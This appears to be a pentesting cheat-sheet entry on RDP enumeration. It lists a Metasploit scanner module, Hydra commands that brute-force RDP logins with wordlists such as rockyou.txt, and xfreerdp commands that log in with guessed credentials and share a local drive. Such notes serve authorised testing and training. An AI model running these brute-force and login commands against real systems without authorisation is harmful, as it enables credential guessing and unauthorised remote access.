---
title: RDP Enumeration
category: recon
subcategory: service-enum
os: linux
command: hydra rdp://target
tools: msfconsole, hydra, xfreerdp
---


### Metasploit

```bash
use auxiliary/scanner/rdp/rdp_scanner
```

### Hydra bruteforce

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt rdp://10.10.2.252 -s 3333
hydra -l mark -P /usr/share/wordlists/rockyou.txt rdp -V -e nsr -f -t 50 -K
```

### Connection

```bash
xfreerdp /u:administrator /p:haslo /v:10.10.2.252:3333
```

### With shared drive

```bash
xfreerdp /v:$target /u:dog /p:dog /cert:ignore +clipboard /dynamic-resolution /drive:.,share
```
